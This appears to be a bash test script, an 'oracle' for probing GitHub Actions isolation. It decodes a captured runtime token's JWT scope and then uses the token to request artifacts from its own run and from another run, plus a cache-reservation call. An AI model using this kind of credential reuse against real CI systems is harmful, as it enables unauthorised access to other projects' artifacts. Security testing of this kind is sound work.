#!/usr/bin/env bash
# T1 oracle: use action-context runtime token against own & cross-repo resources.
set -u
TOK=$(cat reports/runtime-token.txt 2>/dev/null || true)
if [ -z "$TOK" ]; then
  echo "no runtime token in action context either -> isolation confirmed at all layers"
  exit 0
fi

RURL=$(python3 -c "
import json
try:
    d = json.load(open('reports/action-env.json'))
    print(d.get('ACTIONS_RESULTS_URL') or d.get('ACTIONS_RUNTIME_URL') or '')
except Exception:
    print('')
")
[ -n "$RURL" ] || RURL="https://results-receiver.actions.githubusercontent.com/"
BASE="$RURL"; [[ "$BASE" == */ ]] || BASE="${BASE}/"
echo "oracle base: $BASE"

echo "== JWT payload (scope analysis)"
python3 - "$TOK" <<'EOF'
import base64, json, sys
try:
    p = sys.argv[1].split('.')[1]
    p += '=' * (-len(p) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1, sort_keys=True))
except Exception as e:
    print('decode error:', e)
EOF

B_RUN_ID="${B_RUN_ID:-0}"
for RID in "$GITHUB_RUN_ID" "$B_RUN_ID"; do
  tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
  C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $TOK" \
      "${BASE}_apis/pipelines/workflowruns/$RID/artifacts?api-version=6.0-preview" 2>/dev/null || echo 000)
  echo "GET artifacts run=$RID ($tag): $C   <-- cross 200=HIGH FINDING"
  head -c 300 /tmp/o.out; echo
done

# cache service probe via results host (v4 backend)
C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -X POST -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' -d '{}' \
    "${BASE}_apis/artifactcache/caches" 2>/dev/null || echo 000)
echo "cache reserve probe @results: $C"
head -c 200 /tmp/o.out; echo

rm -f reports/runtime-token.txt
echo "ORACLE DONE (token file removed)"
